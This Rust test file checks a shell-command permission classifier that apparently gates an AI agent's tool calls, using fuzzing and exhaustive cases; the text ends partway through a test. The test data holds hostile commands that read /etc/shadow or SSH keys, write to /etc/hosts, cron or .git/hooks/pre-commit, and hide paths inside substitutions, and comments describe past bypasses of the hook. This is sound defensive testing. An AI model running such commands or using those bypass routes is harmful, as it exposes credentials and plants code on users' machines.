//! Property-based safety guards for handler-backed commands.
//!
//! The declarative engine's proptests (`engine::testgen`) only exercise the *level algebra* — they
//! never feed command STRINGS through the classifier — and the registry walkers don't descend
//! `DispatchKind::Custom`, so hand-rolled handlers (mlr, perl, sed, …) had **no generative
//! coverage**. That blind spot is why the mlr `--from data.csv -I cat` fail-open (a value-taking main
//! flag mis-parsed so a later `-I` slipped through) reached adversarial review instead of a red test.
//!
//! These guards close it, all driven by proptest so they explore permutations no hand-written
//! example would:
//!   - `handlers_never_panic_and_are_deterministic` — every handler command, fuzzed, is a total +
//!     deterministic function (no index-out-of-bounds in a token walk, no order-dependence).
//!   - `write_mode_flags_deny_out_of_workspace_targets` — the refined "poison token" invariant: an
//!     in-place / output flag must never let a write land OUTSIDE the workspace (SafeWrite is
//!     local-only). `sed -i file.txt` is a fine local write; `sed -i /etc/hosts` is not.
//!   - `mlr_in_place_flag_denied_anywhere_in_main_region` — `-I`/`--in-place` anywhere in mlr's
//!     pre-verb region is denied, the exact class the `--from … -I` hole belonged to.

use proptest::prelude::*;

use crate::pathctx::PathCtx;
use crate::{command_verdict, command_verdict_in, is_safe_command};

fn workspace() -> PathCtx {
    PathCtx { cwd: Some("/work".into()), root: Some("/work".into()), ..Default::default() }
}

/// EVERY command the classifier knows — handler-backed AND the full TOML registry (~1200+). New
/// commands (either kind) are picked up automatically, so the no-panic/determinism fuzz covers the
/// whole surface, not just hand-rolled handlers.
fn command_names() -> Vec<String> {
    let mut names: Vec<String> =
        crate::handlers::handler_docs().into_iter().map(|d| d.name).collect();
    names.extend(crate::registry::toml_command_names().into_iter().map(str::to_string));
    names.sort();
    names.dedup();
    names
}

/// Argument tokens chosen to stress flag/verb/path parsers: option shapes, separators, the `--`
/// terminator, equals-forms, path-like and bare words.
fn arb_arg_token() -> impl Strategy<Value = String> {
    prop_oneof![
        Just("-i".to_string()),
        Just("-I".to_string()),
        Just("--in-place".to_string()),
        Just("--".to_string()),
        Just("-".to_string()),
        Just("=".to_string()),
        Just("--from".to_string()),
        Just("/etc/passwd".to_string()),
        Just("../x".to_string()),
        Just("data.csv".to_string()),
        "-[a-zA-Z]",
        "--[a-z][a-z-]{0,6}",
        "--[a-z]{1,5}=[a-z,;]{1,3}",
        "[a-z][a-z0-9]{0,4}",
        "[./][a-z/.]{0,6}",
    ]
}

proptest! {
    #![proptest_config(ProptestConfig::with_cases(1500))]

    /// A handler must be a total, deterministic function of the command string: never panic
    /// (e.g. an out-of-bounds `tokens.get` in a flag walk) and never depend on evaluation order.
    #[test]
    fn handlers_never_panic_and_are_deterministic(
        cmd in proptest::sample::select(command_names()),
        args in proptest::collection::vec(arb_arg_token(), 0..6),
    ) {
        let mut parts = vec![cmd];
        parts.extend(args);
        let line = parts.join(" ");
        let a = command_verdict(&line).is_allowed();
        let b = command_verdict(&line).is_allowed();
        prop_assert_eq!(a, b, "nondeterministic verdict for `{}`", line);
    }
}

/// Shell metacharacters + structural keywords that stress the CST/parser layers ABOVE the leaf
/// handlers — quotes, substitutions, chains, redirects, loop/if keywords, nesting.
fn arb_shell_fragment() -> impl Strategy<Value = String> {
    prop_oneof![
        Just("\"".into()), Just("'".into()), Just("`".into()), Just("\\".into()),
        Just("$(".into()), Just(")".into()), Just("${".into()), Just("}".into()),
        Just("(".into()), Just("{".into()), Just("[".into()), Just("]".into()),
        Just("|".into()), Just("&&".into()), Just("||".into()), Just(";".into()),
        Just("\n".into()), Just(">".into()), Just("<".into()), Just("&".into()), Just("=".into()),
        Just("for".into()), Just("do".into()), Just("done".into()),
        Just("if".into()), Just("then".into()), Just("fi".into()), Just("while".into()),
        Just("bash".into()), Just("-c".into()), Just("perl".into()), Just("-e".into()),
        Just("sed".into()), Just("mlr".into()), Just("find".into()), Just("git".into()),
        Just("xargs".into()), Just("rm".into()), Just("cargo".into()), Just("go".into()),
        "[a-z]{1,4}", "-[a-z]{1,3}", "[/.~][a-z/.]{0,4}", "\\$[A-Za-z]{1,3}",
    ]
}

proptest! {
    #![proptest_config(ProptestConfig::with_cases(2500))]

    /// The WHOLE classifier (parse → CST → engine → handlers) is a total, deterministic function of
    /// ANY string — arbitrary metacharacters, unbalanced quotes/parens/substitutions, chains,
    /// redirects, keyword salads. It never panics (a panic in the hook is a crash → fail-open) and
    /// never depends on evaluation order. Reaches parser paths the per-command arg fuzz can't.
    #[test]
    fn arbitrary_command_strings_never_panic(
        frags in proptest::collection::vec(arb_shell_fragment(), 0..28),
    ) {
        let line = frags.join(" ");
        let a = command_verdict(&line).is_allowed();
        let b = command_verdict(&line).is_allowed();
        prop_assert_eq!(a, b, "nondeterministic verdict for `{}`", line.escape_debug().to_string());
    }
}

/// Run `command_verdict` on a worker thread; `true` iff it FINISHED (without panicking) within
/// `budget`. `false` means it panicked or HUNG — both are bugs for a PreToolUse hook that must
/// return promptly and never crash. A genuinely-hung worker leaks, which is acceptable in a test
/// that has, by that point, already failed.
fn finishes_within(input: &str, budget: std::time::Duration) -> bool {
    let owned = input.to_string();
    let (tx, rx) = std::sync::mpsc::sync_channel::<()>(1);
    std::thread::spawn(move || {
        let done = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            let _ = command_verdict(&owned);
        }));
        if done.is_ok() {
            let _ = tx.send(());
        }
    });
    rx.recv_timeout(budget).is_ok()
}

/// TERMINATION / anti-DoS guard. The classifier must complete PROMPTLY on adversarial input — no
/// infinite loop (a byte-walk index that fails to advance) and no super-linear blow-up (a nested
/// re-scan). A hook that hangs is a denial of service and, depending on the harness timeout policy,
/// a fail-open. Each pathological input — long repeats, deep unbalanced nesting, and per-grammar
/// worst cases for the hand-rolled analyzers (perl interpolation, sed scripts, mlr chains, find,
/// awk, git -c) — must classify within the budget.
#[test]
fn classifier_terminates_on_adversarial_input() {
    let budget = std::time::Duration::from_millis(1500);
    let n = 100_000;
    let corpus: Vec<String> = vec![
        "(".repeat(n), ")".repeat(n), "$(".repeat(n / 2), "`".repeat(n),
        "\"".repeat(n), "'".repeat(n), "{".repeat(n), "}".repeat(n), "[".repeat(n),
        "|".repeat(n), ";".repeat(n), "&".repeat(n), "a".repeat(n), " ".repeat(n),
        "-".repeat(n), "\n".repeat(n / 100), "&&".repeat(n / 2), "><".repeat(n / 2),
        format!("echo {}", "$(".repeat(n / 4)),
        format!("{}echo hi", "for x in a; do ".repeat(n / 200)),
        format!("{}fi", "if true; then ".repeat(n / 200)),
        // per-handler pathological inputs (nested / unbalanced in the ANALYZED grammars)
        format!("perl -e 'print \"{}\"'", "@{".repeat(n / 2)),  // interpolation-block re-scan
        format!("perl -e '{}'", "@{[".repeat(n / 3)),
        format!("sed '{}'", "s/a/b/;".repeat(n / 8)),
        format!("sed '{}'", "{".repeat(n / 2)),
        format!("mlr {}", "cat then ".repeat(n / 10)),
        format!("find . {}", "-name x ".repeat(n / 10)),
        format!("awk '{}'", "{print}".repeat(n / 8)),
        format!("git -c {} log", "a=b ".repeat(n / 8)),
        "a\"b'c`d$e(f)g{h}[i]|j".repeat(n / 20),
        // Interleaved UNCLOSED command/process substitutions with word chars between the openers.
        // `cmd_sub`/`proc_sub` used to recurse into the inner script BEFORE checking for a close, so
        // every opener re-parsed the whole remaining tail and winnow's alt/repeat retried overlapping
        // work at each level — exponential (a$(a<(a × 14 already ran >30s). Found by the parse fuzzer.
        "a$(a<(a".repeat(25),
        "a<(a$(a".repeat(25),
        "a$(a`a".repeat(25),
        "a$((a$(a".repeat(25),
        "a$(b<(c$(d`e".repeat(20),
        // Nested exec-delegation: `fd -x`/`find -exec` re-classify the wrapped command, and NESTING
        // them branches multiplicatively (one re-check per pre-exec base × per level) — exponential
        // at the CLASSIFY layer, past what the parser's own budget sees. Found by the parse fuzzer.
        "fd fd -x ".repeat(40),
        "fd a b -x ".repeat(30),
        "find . -exec find . -exec ".repeat(20),
        format!("{}echo hi", "fd a -x fd b -x ".repeat(30)),
        // Function-resolution blow-ups: exponential FAN-OUT (each fn calls the next twice), deep
        // linear chains, direct/mutual recursion, and long assignment chains. Bounded by the depth
        // cap + the shared classification budget, so they fail closed rather than hang.
        (0..40).map(|i| format!("f{i}(){{ f{}; f{}; }}; ", i + 1, i + 1)).collect::<String>() + "f0",
        (0..2000).map(|i| format!("f{i}(){{ f{}; }}; ", i + 1)).collect::<String>() + "f0",
        "r(){ r; }; ".to_string() + &"r; ".repeat(2000),
        "a(){ b; }; b(){ a; }; ".to_string() + &"a; ".repeat(1000),
        (0..3000).map(|i| format!("V{i}=$V{}; ", i + 1)).collect::<String>() + "cat $V0",
    ];
    let mut slow = Vec::new();
    for input in &corpus {
        if !finishes_within(input, budget) {
            let head = input.chars().take(24).collect::<String>();
            slow.push(format!("len {} starting `{}`", input.len(), head.escape_debug()));
        }
    }
    assert!(slow.is_empty(), "classifier hung/panicked (>{budget:?}) on:\n  {}", slow.join("\n  "));
}

/// The same termination contract, enforced over the COMMITTED fuzz corpus (`fuzz/corpus/parse/seed-*`)
/// rather than a hand-written list. The nightly fuzzer finds real pathological inputs that nobody
/// would think to write down — the `seed-slow-*` entries took 1.2s, 1.5s and 5.8s before brace-
/// expansion fan-out was charged to the shared classification budget (it multiplied with the
/// delegation cap instead of adding). Enumerating the directory means every input a future nightly
/// promotes to a committed seed is covered here automatically, with no list to remember to extend.
///
/// Skips cleanly when the corpus is absent (a source checkout without the fuzz dir), and says so.
#[test]
fn classifier_terminates_on_the_committed_fuzz_corpus() {
    let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("fuzz/corpus/parse");
    let Ok(entries) = std::fs::read_dir(&dir) else {
        eprintln!("skipped: no corpus at {} (nothing to replay)", dir.display());
        return;
    };
    let budget = std::time::Duration::from_millis(1500);
    let (mut checked, mut slow) = (0usize, Vec::new());
    for entry in entries.flatten() {
        let path = entry.path();
        // Only the COMMITTED seeds: generated `gen-*` seeds and libFuzzer's hash-named entries are
        // git-ignored, so they are absent in CI and must not make this test environment-dependent.
        if !path.file_name().and_then(|n| n.to_str()).is_some_and(|n| n.starts_with("seed-")) {
            continue;
        }
        let Ok(bytes) = std::fs::read(&path) else { continue };
        checked += 1;
        let input = String::from_utf8_lossy(&bytes).into_owned();
        if !finishes_within(&input, budget) {
            slow.push(format!("{} ({} bytes)", path.display(), bytes.len()));
        }
    }
    assert!(slow.is_empty(), "classifier hung/panicked (>{budget:?}) on committed seeds:\n  {}", slow.join("\n  "));
    eprintln!("replayed {checked} committed seed(s) within {budget:?}");
}

proptest! {
    #![proptest_config(ProptestConfig::with_cases(400))]

    /// GENERALIZES `classifier_terminates_on_adversarial_input` beyond its fixed corpus: a random walk
    /// over the substitution alphabet (openers, closers, quotes, escape, word chars) must classify
    /// within a tight budget. The `a$(a<(a` exponential lived in exactly this alphabet, and the class
    /// — not that one string — is what must stay dead as new constructs are added to the grammar.
    #[test]
    fn substitution_salad_terminates_fast(
        toks in proptest::collection::vec(
            prop_oneof![
                Just("a"), Just("$("), Just("<("), Just(">("), Just("$(("),
                Just("`"), Just("'"), Just("\""), Just(")"), Just("\\"), Just(" "),
            ],
            0..40,
        ),
    ) {
        let input: String = toks.concat();
        prop_assert!(
            finishes_within(&input, std::time::Duration::from_millis(500)),
            "classifier hung on substitution salad: {:?}", input
        );
    }
}

// The refined poison-token guard. Each template writes to a `{p}` slot — via a write-enabling FLAG
// (`-i`) or a write command EMBEDDED in a script (`sed 'w …'`). Substituting an out-of-workspace
// target must be DENIED (SafeWrite is local-only); the sed cases are exactly the `1w /etc/cron.d/x`
// class the operand path-gate can't see because the path lives inside the script token.
const WRITE_MODE_CASES: &[&str] = &[
    "sed -i 's/a/b/' {p}",
    "sed --in-place 's/a/b/' {p}",
    "sed 'w {p}' input.txt",
    "sed '1w {p}' input.txt",
    "sed 's/a/b/w {p}' input.txt",
    "perl -i -pe 's/a/b/' {p}",
    "perl -i.bak -pe 's/a/b/' {p}",
    "mlr -I --csv cat {p}",
    "mlr --in-place --csv cat {p}",
];

// The read counterpart: a command that READS a `{p}` named inside an argument must not disclose an
// out-of-workspace / secret file. `sed 'r /etc/shadow'` is the class.
//
// The second group is the operand form, and it is here because a real fail-open lived in it:
// `perl -pe 's/a/b/' /etc/shadow` auto-approved, because the perl handler gated the CODE against an
// identifier allowlist and never looked at the file operands at all. An inert one-liner is only
// half the question — under `-n`/`-p` the interpreter still opens each operand and prints it, so a
// benign transform over a credential file is a credential read. Every inline interpreter that wraps
// an implicit read loop belongs here, so a newly-added one is caught by this guard rather than by a
// user noticing the prompt never came.
const READ_MODE_CASES: &[&str] = &[
    "sed 'r {p}' input.txt",
    "sed 'R {p}' input.txt",
    "perl -pe 's/a/b/' {p}",
    "perl -ne 'print' {p}",
    "perl -0pe 's/a/b/' {p}",
    "perl -lpe 's/a/b/' {p}",
    "sed 's/a/b/' {p}",
    "awk '{print}' {p}",
    "ruby -pe 'puts' {p}",
    "mlr --csv cat {p}",
    // Path-GATED readers, not engine-resolved ones. They pre-filter operands through
    // `looks_like_path`, so they are the shape that missed a bare `~` — worth holding here rather
    // than trusting the gate to keep seeing them.
    "rg x {p}",
    "od {p}",
    "shred {p}",
];

// Targets outside the /work workspace. Deliberately excludes /tmp and /dev (admitted scratch loci).
//
// A BARE `~` is here on purpose and is the one spelling that carries neither `/` nor `.`, so it is
// what any surviving path-SHAPE test fails to see. It briefly lived in a separate list because
// adding it here failed the `rg`/`awk`/`mlr` guards — those were not corpus noise but a real
// over-approval in `looks_like_path`, now fixed, so the lists are one again.
const OUT_OF_WORKSPACE: &[&str] = &[
    "/etc/hosts",
    "/etc/passwd",
    "/root/.bashrc",
    "/usr/local/bin/x",
    "~/.ssh/id_rsa",
    "~/.bashrc",
    "~",
    "~root",
    "../outside.txt",
    "../../escape.txt",
];

// A substitution whose inner command DECLARED its output locus (`[command.output]`) evaluates to a
// bounded sentinel rather than the worst-cased one. These templates put that sentinel in an operand
// and a redirect slot; `{p}` is the inner command's search ROOT, so a hot root must still deny —
// admitting the value must never admit more than reading the root itself would.
const DECLARED_SUB_CASES: &[&str] = &[
    "cat $(fd pat {p})",
    "cat $(fd -a pat {p})",
    "cat $(fd pat {p} | head -1)",
    "cat $(fd pat {p} | sort | head -1)",
    "grep -rn foo $(fd pat {p})",
    "cat `fd pat {p}`",
    "echo hi > $(fd pat {p})",
    "cat $(fd --search-path={p} pat)",
    "cat $(fd --base-directory {p} pat)",
    "cat $(fd -E{p} pat)",
    // Nesting composes — a tagged sentinel classifies like the path it stands for — so a hot root
    // must still surface through an inner substitution rather than being laundered by the outer.
    "cat $(fd pat $(fd d {p}))",
    "cat $(fd a $(fd b $(fd c {p})))",
    // TWO substitutions in one word, the hot one SECOND. Reading only the leading tag classified
    // everything after it as ordinary text, so a worktree tag in front hid a machine tag behind.
    "cat $(pwd)/$(fd d {p})",
    "echo hi > $(pwd)/$(fd d {p})",
    "cat $(fd d app/)/$(fd d {p})",
    // Bound to a variable first. This is its own path through the classifier — the value is
    // frozen at assignment and re-expanded at use — and it leaked once: the tag was read before
    // expansion, so `$OUT` still hid it and the expanded sentinel classified as a relative path.
    "OUT=$(fd d {p}); cat \"$OUT/x\"",
    "OUT=$(fd d {p}); echo hi > \"$OUT/x\"",
    "OUT=$(fd d {p}); cat < \"$OUT/x\"",
    // A path-GATED output flag. `pathgate` decides whether a value is an operand worth gating, and
    // it asked `is_unpinnable` — which a declared substitution stopped being, so the value skipped
    // the gate entirely and `asciidoctor -o $(fd a /etc)` shipped an ungated write. That is the
    // SSH-key-injection class the 1.0 review closed, briefly reopened for tagged substitutions.
    "asciidoctor -o $(fd a {p}) in.adoc",
    "dot -o $(fd a {p}) g.dot",
    "gs -o $(fd a {p}) in.ps",
    // A loop over the substitution's results. `loop_reprs` binds the loop variable to the list's
    // worst item, so a hot root must reach the body's `$f` rather than being flattened away.
    "for f in $(fd a {p}); do cat $f; done",
    "for f in $(fd a {p}); do echo hi > $f; done",
    "for f in $(fd a {p}); do cat \"$f\"; done",
];

// Suffixes appended to a BOUNDED substitution. Descending stays inside the tagged locus, but
// climbing leaves it, and a second unpinnable piece re-opens the hole the tag closed — so these
// must all deny even though `$(pwd)` itself is worktree.
const TAGGED_RESIDUE_CASES: &[&str] = &[
    "cat $(pwd)/../../../etc/shadow",
    "cat $(pwd)/../../..",
    "cat $(pwd)/$SECRET",
    "cat $(pwd)/$(hostname)",
    "echo hi > $(pwd)/../../../etc/hosts",
];

/// Writes into the worktree-TRUSTED rung, reached through a bounded substitution. The tag says
/// where the substitution's own value points; it says nothing about what is appended to it, and
/// reporting the tag alone let `echo hi > $(pwd)/.git/hooks/pre-commit` plant an auto-executing
/// git hook that the literal spelling denies. Reads are deliberately absent — the rung is
/// read-ok/write-frozen, so `cat $(pwd)/.git/config` is expected to pass.
const TRUSTED_WRITE_VIA_SUB_CASES: &[&str] = &[
    "echo hi > $(pwd)/.git/hooks/pre-commit",
    "echo hi > $(pwd)/.git/config",
    "echo hi > $(pwd)/.envrc",
    "echo hi >> $(pwd)/.envrc",
    "echo hi >| $(pwd)/.git/config",
    "OUT=$(pwd); echo hi > \"$OUT/.git/hooks/pre-commit\"",
    "for f in $(pwd); do echo hi > $f/.envrc; done",
    "cp ./x $(pwd)/.git/config",
    // An unknown FILENAME from a hidden-capable search could itself be `.envrc`, and the
    // classifier only ever sees the search root — so the claim is dropped at the flag instead.
    "echo hi > $(fd -H x app/)",
    "echo hi > $(fd -u x app/)",
    "echo hi > $(fd --no-ignore x app/)",
    "for f in $(fd -H x app/); do echo hi > $f; done",
];

// ── Abstraction soundness ──────────────────────────────────────────────────────────────────────
//
// Every hole found in the substitution work was one mistake wearing different clothes: a bound
// computed for ONE PART of a path being applied to the WHOLE path. The operand's shape stood in
// for the root; the root's rung stood in for everything beneath it; the first tag stood in for the
// rest of the word; `is_unpinnable` stood in for "is this an operand at all". Each was fixed by a
// corpus entry that required IMAGINING the failure first, which is why there were four of them.
//
// The general property needs no imagination. A substitution is an ABSTRACTION over a set of
// concrete paths, so soundness is the usual abstract-interpretation obligation:
//
//     verdict(ctx[$(…)])  must be no more permissive than  verdict(ctx[c])
//     for every concrete c the substitution could produce
//
// The expectation therefore comes from the LITERAL spelling — already correct and heavily tested —
// instead of from a hand-written expected value. Over-denial stays legal; only laundering fails.
//
// Witness suffixes come from `regions/default.toml`, so a newly-protected region is probed the
// moment it is declared. That is what makes this catch the `.git/hooks/pre-commit` class without
// anyone having thought of git hooks.

/// Roots an abstraction can be pointed at. Spans the loci that matter AND the AIM dimension: a
/// root that is itself hidden/trusted (`app/.git`, `app/.envrc`) or a credential store is how an
/// operation POINTS at the frozen rung, which is the thing the rung exists to refuse — as opposed
/// to a sweep passing over it, which policy admits (see `Reach`).
const ABSTRACTION_ROOTS: &[&str] =
    &["app", "/etc", "~", "~/.ssh", "..", "/work", "app/.git", "app/.envrc", "app/.ssh"];

/// Contexts that consume a path, spanning the OPERATIONS that gate differently — a plain read, all
/// three write-redirect modes, a copy destination, a path-gated output flag, a loop body, and a
/// variable binding. `{}` is the path slot.
const ABSTRACTION_CONTEXTS: &[&str] = &[
    "cat {}",
    "echo hi > {}",
    "echo hi >> {}",
    "echo hi >| {}",
    "cat < {}",
    "cp ./src.txt {}",
    "asciidoctor -o {} in.adoc",
    "for f in {}; do cat $f; done",
    "for f in {}; do echo hi > $f; done",
    "OUT={}; cat \"$OUT\"",
    "OUT={}; echo hi > \"$OUT\"",
];

/// Every spelling that puts `{root}` in front of a declared substitution.
const ABSTRACTION_SUBS: &[&str] = &[
    "$(fd pat {root})",
    "$(fd -a pat {root})",
    "`fd pat {root}`",
    "$(fd pat {root} | head -1)",
    "$(fd pat {root} | sort | uniq)",
    "$(fd --base-directory {root} pat)",
    "$(fd --search-path={root} pat)",
];

/// The concrete paths `$(fd pat {root})` could actually print — the substitution's concretization
/// set γ. Only NON-HIDDEN paths beneath `root`, because default fd skips hidden entries, which is
/// the same fact `fd.toml` encodes by voiding its claim under `-H`/`-u`/`--no-ignore`. Widening γ
/// past what the claim allows produces false positives, not findings; `fd_claim_assumption_holds`
/// checks the coupling rather than trusting this comment.
fn abstraction_witnesses(root: &str) -> Vec<String> {
    ["", "/plain.txt", "/sub/plain.txt"].iter().map(|s| format!("{root}{s}")).collect()
}

/// Literal text appended AFTER the path expression — the residue that the tag says nothing about,
/// and where `$(pwd)/.git/hooks/pre-commit` lived. Drawn from the region table so a newly-declared
/// protected path becomes a probe the moment it exists, rather than when someone remembers it.
fn abstraction_suffixes() -> Vec<String> {
    let mut out = vec![String::new()];
    for region in crate::engine::resolve::regions::declared_region_paths() {
        // Only the ANCHORLESS entries make sense beneath another directory — those are exactly the
        // model's "nests at any depth" regions (`.git`, `.envrc`). A `/etc/…` or `~/.ssh` entry is
        // anchored somewhere specific, and pasting it after a path yields `/work/~/.config/gh`,
        // which is a nonsense string rather than a reachable file.
        if region.starts_with('/') || region.starts_with('~') || region.contains('*') {
            continue;
        }
        let rel = region.trim_end_matches('/');
        if rel.is_empty() {
            continue;
        }
        out.push(format!("/{rel}"));
        out.push(format!("/{rel}/inner"));
    }
    out
}

/// The witness set above assumes default `fd` cannot print a hidden path. That is only true while
/// `fd.toml` voids its output claim under the hidden/no-ignore flags — so assert it, rather than
/// leaving the property's soundness argument resting on a comment.
#[test]
fn fd_claim_assumption_holds() {
    let spec = crate::registry::command_output_locus("fd").expect("fd declares [command.output]");
    for flag in ["-H", "--hidden", "-u", "--unrestricted", "-I", "--no-ignore"] {
        assert!(
            spec.invalidated_by.iter().any(|f| f == flag),
            "fd's output claim must be voided by `{flag}`: the abstraction-soundness witnesses \
             assume default fd cannot print a hidden path, so without this the property probes a \
             smaller set than fd can actually produce",
        );
    }
}

// ── Abstraction soundness, generalized ─────────────────────────────────────────────────────────
//
// A substitution is not the only place the classifier replaces a concrete path with an
// approximation. A `$VAR` binding, a `for`-loop variable, a glob, `find -exec {}` and a
// `while read` variable all do it, and every one of them owes the same obligation. This is the
// substitution property applied to each site, with the site's own concretization set.
//
// Getting that set right IS the test. Too large and it reports paths the abstraction cannot
// reach; too small and it stops seeing real laundering. The one thing that separates these sites
// is whether they traverse HIDDEN files, and it is decisive: a shell glob never matches a leading
// dot, so `app/*` cannot be `app/.git`, while `find app` walks straight into it.

/// What a site's abstraction is AIMED at beneath a root.
///
/// Aim, not reach — and the distinction is the project's policy, established by a pair the
/// classifier already decides: `rm -rf app` is admitted while `rm -rf app/.git` is refused, though
/// both delete `app/.git`. The trusted rung guards against POINTING at `.git`/`.envrc` (planting a
/// hook is code injection); it does not try to stop a broad worktree sweep from passing over them,
/// because that is what the `scale` facet is for and because refusing it would take `grep -r`,
/// `rm -rf build/` and every recursive tool with it.
///
/// So a hidden descendant is deliberately NOT in any concretization set here. An earlier draft put
/// it in and produced 272 "violations" — all of them `find -exec` and `while read` sweeps reading
/// an `app/.ssh` that the very same policy admits via `grep -r pattern app`. Those were the test
/// asserting a stricter policy than the one that exists, not findings. The AIM dimension is probed
/// instead by pointing the roots themselves at hidden and hot locations.
#[derive(Clone, Copy, PartialEq)]
enum Reach {
    /// Exactly the root — a literal bound to a variable or listed in a loop.
    Exact,
    /// Descendants the abstraction can name individually. No hidden component: shell globs do not
    /// match a leading dot, `fd` skips hidden entries, and for a sweep the hidden files it walks
    /// are blast radius rather than aim (see above).
    Visible,
}

struct AbstractionSite {
    name: &'static str,
    /// Builds the abstract command. `op` carries an `@` path slot — `@` rather than `{}` because
    /// `find -exec` spends `{}` on its own operand.
    build: fn(op: &str, root: &str) -> String,
    reach: Reach,
    /// Whether this site can carry a shell-construct op (see `ABSTRACTION_OPS`).
    takes_shell_ops: bool,
}

/// Operations that gate differently, so a site is probed on each face rather than on reads alone.
/// The second field marks an op that is a SHELL construct rather than a command: a redirect binds
/// at the shell level, so `find … -exec echo hi > {} ;` redirects find's own output to a file named
/// `{}` instead of writing each match. Composing those with `find -exec` probes a command nobody
/// wrote, so the site skips them.
const ABSTRACTION_OPS: &[(&str, bool)] = &[
    ("cat @", false),
    ("echo hi > @", true),
    ("cp ./src.txt @", false),
    ("rm -rf @", false),
    ("asciidoctor -o @ in.adoc", false),
];

const ABSTRACTION_SITES: &[AbstractionSite] = &[
    AbstractionSite {
        name: "command substitution",
        build: |op, root| op.replace('@', &format!("$(fd pat {root})")),
        reach: Reach::Visible,
        takes_shell_ops: true,
    },
    AbstractionSite {
        name: "variable binding",
        build: |op, root| format!("X={root}; {}", op.replace('@', "\"$X\"")),
        reach: Reach::Exact,
        takes_shell_ops: true,
    },
    AbstractionSite {
        name: "for-loop over a literal",
        build: |op, root| format!("for f in {root}; do {}; done", op.replace('@', "\"$f\"")),
        reach: Reach::Exact,
        takes_shell_ops: true,
    },
    AbstractionSite {
        name: "glob operand",
        build: |op, root| op.replace('@', &format!("{root}/*")),
        reach: Reach::Visible,
        takes_shell_ops: true,
    },
    AbstractionSite {
        name: "for-loop over a glob",
        build: |op, root| format!("for f in {root}/*; do {}; done", op.replace('@', "\"$f\"")),
        reach: Reach::Visible,
        takes_shell_ops: true,
    },
    AbstractionSite {
        name: "find -exec",
        build: |op, root| format!("find {root} -exec {} ;", op.replace('@', "{}")),
        reach: Reach::Visible,
        // A redirect binds at the shell, so `find … -exec echo hi > {} ;` sends find's own output
        // to a file called `{}` — a different command from the one being modelled.
        takes_shell_ops: false,
    },
    AbstractionSite {
        name: "while read from find",
        build: |op, root| {
            format!("find {root} -type f | while read f; do {}; done", op.replace('@', "\"$f\""))
        },
        reach: Reach::Visible,
        takes_shell_ops: true,
    },
];

/// The concrete paths a site AIMS at beneath `root`. Hidden descendants are excluded on purpose —
/// they are blast radius rather than aim, and the AIM cases arrive as hidden ROOTS instead.
fn site_witnesses(root: &str, reach: Reach) -> Vec<String> {
    let mut out = vec![root.to_string()];
    if reach == Reach::Exact {
        return out;
    }
    out.push(format!("{root}/plain.txt"));
    out.push(format!("{root}/sub/plain.txt"));
    out
}

/// Every abstraction site owes the same obligation the substitution one does: it must never be
/// more permissive than a concrete path it could denote.
///
/// Exhaustive for the same reason — the space is small and sampling already proved able to miss
/// the one pairing that mattered.
#[test]
fn no_abstraction_is_more_permissive_than_a_path_it_could_denote() {
    let mut violations = Vec::new();
    let mut unconstrained_sites = Vec::new();

    for site in ABSTRACTION_SITES {
        let mut constrained = 0usize;
        for (op, shell_construct) in ABSTRACTION_OPS {
            if *shell_construct && !site.takes_shell_ops {
                continue;
            }
            for root in ABSTRACTION_ROOTS {
                let abstracted = (site.build)(op, root);
                let abstract_allowed = command_verdict_in(&abstracted, workspace()).is_allowed();
                for witness in site_witnesses(root, site.reach) {
                    let concrete = op.replace('@', &witness);
                    if command_verdict_in(&concrete, workspace()).is_allowed() {
                        continue;
                    }
                    constrained += 1;
                    if abstract_allowed {
                        violations.push(format!(
                            "  [{}] `{concrete}` denies but `{abstracted}` allows",
                            site.name,
                        ));
                    }
                }
            }
        }
        // PER SITE, not once overall. A global count is satisfied by whichever site happens to
        // produce cases, so a site whose templates stopped parsing — a renamed flag, a grammar
        // change — would sit there contributing nothing while the test stayed green and appeared
        // to cover it.
        if constrained == 0 {
            unconstrained_sites.push(site.name);
        }
    }

    assert!(
        unconstrained_sites.is_empty(),
        "these sites produced no refused witness, so the property is vacuous for them: {unconstrained_sites:?}",
    );
    assert!(
        violations.is_empty(),
        "an abstraction was more permissive than a path it could denote ({} cases):\n{}",
        violations.len(),
        violations.join("\n"),
    );
}

/// A substitution must never be MORE PERMISSIVE than a concrete path it could produce.
///
/// The general form of every substitution fail-open found so far. It needs no hand-written
/// expectation: the literal spelling — already correct and heavily tested — IS the expectation, so
/// a laundering bug shows up without anyone having imagined that particular route to it.
///
/// EXHAUSTIVE rather than sampled, deliberately. As a `proptest` over the same space this passed
/// against a reintroduced pathgate bug: the space is ~10k combinations, proptest draws 256, and the
/// one pairing that mattered (`asciidoctor -o` with an `/etc` root) simply never came up. A finite
/// cross-product this cheap should be enumerated — it also makes the red demos deterministic.
///
/// Red→green, all four historical bugs, each caught with its corpus entries removed: the shape
/// test on roots, the pathgate `is_unpinnable` key, the pre-expansion tag read, and the
/// unclassified residue.
#[test]
fn substitution_is_never_more_permissive_than_a_path_it_could_produce() {
    let suffixes = abstraction_suffixes();
    let mut violations = Vec::new();
    let mut constrained = 0usize;

    for ctx in ABSTRACTION_CONTEXTS {
        for root in ABSTRACTION_ROOTS {
            for suffix in &suffixes {
                for witness in abstraction_witnesses(root) {
                    let concrete = ctx.replace("{}", &format!("{witness}{suffix}"));
                    // Only a witness the classifier REFUSES constrains the abstraction; an allowed
                    // one says nothing, since a different witness may still force the denial.
                    if command_verdict_in(&concrete, workspace()).is_allowed() {
                        continue;
                    }
                    constrained += 1;
                    for sub in ABSTRACTION_SUBS {
                        let path = format!("{}{suffix}", sub.replace("{root}", root));
                        let abstracted = ctx.replace("{}", &path);
                        if command_verdict_in(&abstracted, workspace()).is_allowed() {
                            violations.push(format!("  `{concrete}` denies but `{abstracted}` allows"));
                        }
                    }
                }
            }
        }
    }

    assert!(constrained > 0, "no witness was refused — the property is vacuous");
    assert!(
        violations.is_empty(),
        "a substitution was more permissive than a path it could produce ({} cases):\n{}",
        violations.len(),
        violations.join("\n"),
    );
}

proptest! {
    /// A declared output-locus claim must never admit a substitution whose root is out of the
    /// workspace. This is the fail-open the feature risks: the value is admitted at the tagged
    /// rung, so an under-counted root would auto-approve a read of `/etc`.
    #[test]
    fn declared_substitutions_deny_out_of_workspace_roots(
        template in proptest::sample::select(DECLARED_SUB_CASES.to_vec()),
        target in proptest::sample::select(OUT_OF_WORKSPACE.to_vec()),
    ) {
        let line = template.replace("{p}", target);
        let allowed = command_verdict_in(&line, workspace()).is_allowed();
